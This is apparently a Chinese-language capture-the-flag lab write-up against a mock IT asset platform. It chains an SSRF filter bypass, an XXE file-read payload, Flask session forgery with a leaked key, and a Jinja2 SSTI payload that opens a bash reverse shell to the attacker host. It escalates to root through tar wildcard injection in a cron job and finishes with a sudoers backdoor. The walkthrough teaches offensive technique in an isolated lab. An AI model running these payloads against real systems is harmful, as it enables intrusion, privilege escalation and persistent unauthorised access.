**环境**：靶机 10.10.1.29:8000（渝信企业 IT 资产管控平台），攻击机 Kali 10.10.1.186。

### **<span style="color:#3498db">信息收集与绕过拦截</span>**

平台首页有个"**网络拨测工具**"，输入 URL 由服务器去请求——又是一个 SSRF 点。直接填 `http://localhost` 试试内网，被拦了：

> Error: 安全策略拦截：不允许拨测内部网络地址！

![mm](/assets/img/2025-07-01-14-16-58.png)
![mm](/assets/img/2025-07-01-14-35-09.png)

这种拦截基本都是**查字符串**（见到 localhost、127.0.0.1 就拒）。换个写法：`127.0.0.1` 的进制形式是 **2130706433**（IP 本质是个 32 位整数，十进制写法浏览器/程序都认）：

```text
http://2130706433:8000/internal/...
```

**字符串里没有 localhost，拦截直接失效**。绕过拦截后对内网端口做爆破，发现 8000 端口本身就有内部接口：

![mm](/assets/img/2025-07-01-16-23-59.png)

### **<span style="color:#3498db">XXE 从"无回显"到回显</span>**

内部接口 `/internal/sync_config` 收一个 `xml` 参数，测试平台会替我们请求并**回显响应**——把 XXE 的 payload 塞进参数，就能借平台的回显把文件内容带出来：

![mm](/assets/img/2025-07-02-14-16-05.png)

直接读文件的实体没有回显槽位，探测发现响应里 **`version` 标签的内容会被回显**，于是把实体塞进 `version` 就行：

```xml
<?xml version="1.0"?>
<!DOCTYPE sync_config [
<!ENTITY readfile SYSTEM "file:///etc/passwd">
]>
<sync_config>
  <version>&readfile;</version>
</sync_config>
```

### **<span style="color:#3498db">从 /proc 摸到项目路径</span>**

常规文件读得差不多后，重点看 `/proc`。读 `/proc/778/maps`（进程 PID 778 的内存映射表）时，**进程加载的第三方库 `.so` 文件路径会完整暴露**：

![mm](/assets/img/2025-07-02-16-19-48.png)

一眼锁定：项目在 **`/opt/yx-asset/`**，用 venv 跑着 Python 3.12，且加载了 **`lxml`**——有 XML 解析库，XXE 能打的根因也交代了。

直接读 app.py 源码，响应里把整个 Flask 应用源码带了出来：

![mm](/assets/img/2025-07-02-19-28-10.png)

顺着读配置文件，拿到了 **Flask 的 SECRET_KEY**：

### **<span style="color:#3498db">伪造 Flask 会话进后台</span>**

**Flask 的 session 是"签名 cookie"**：数据（比如 `{"role":"admin"}`）在 cookie 里明文可见，服务器靠 SECRET_KEY 验签保证没人改过。反过来——**拿到了 SECRET_KEY 就等于拿到了签名权，想要什么身份就签什么身份**：

```bash
flask-unsign --sign --cookie '{"role":"admin"}' --secret '<泄露的KEY>'
```

把生成出来的 session 值填进浏览器 cookie，刷新——管理员后台进去了：

![mm](/assets/img/2025-07-02-17-24-38.png)

### **<span style="color:#3498db">Jinja2 SSTI 拿 shell</span>**

后台的"自定义监控报表"功能写着"使用高级模板引擎（Jinja2）生成动态报表"——**用户的输入会被当模板渲染**，这就是 **SSTI（服务端模板注入）**：模板里的 `{{...}}` 会在服务端求值，会 Python 就能拿 shell。

用 `attr` 一层层摸到全局函数（`'__ini'+'t__'` 拆开写是绕关键词过滤的常见小手段）：

```python
{{config|attr('__class__')|attr('__ini'+'t__')|attr('__glo'+'bals__')|attr('get')('os')|attr('popen')('bash -c "bash -i >& /dev/tcp/10.10.1.186/4444 0>&1"')|attr('read')()}}
```

![mm](/assets/img/2025-07-02-19-00-44.png)
![mm](/assets/img/2025-07-02-19-01-01.png)

反弹 shell 到手（`asset` 用户）。

### **<span style="color:#3498db">tar 通配符提权</span>**

翻了翻没找到有写权限的提权点，看定时任务——`/etc/cron.d` 里有个 `asset_backup`：**每分钟**以 root 执行一次打包：

```bash
#Ansible: Backup Asset Logs
*/1 * * * * root cd /var/backups/asset_logs && tar -czvf /tmp/asset_logs_backup.tar.gz * > /dev/null 2>&1
```

![mm](/assets/img/2025-07-03-10-43-00.png)

**`tar ... *` 是经典的通配符注入点**：通配符展开后，目录里的"文件名"会变成传参。在目录里造两个文件（名字就是参数）：

```bash
cd /var/backups/asset_logs
touch -- '--checkpoint=1'
echo 'chmod u+s /bin/bash' > cc.sh
touch -- '--checkpoint-action=exec=bash cc.sh'
```

（要执行的命令写成脚本再调用——因为参数值里出现 `/` 会被 tar 当成路径的一部分解析，直接写命令会失败。）

等一分钟，cron 展开 `*` 时这两个"文件名"被 tar 当参数解析，**以 root 执行我们的命令**。给 bash 加上 SUID 后原地提权（`-p` 保留特权）：

```bash
/bin/bash -p
whoami    # root
```

最后在 sudoers 里加一行全量免密，留个后门：

```text
asset ALL=(ALL) NOPASSWD:ALL
```
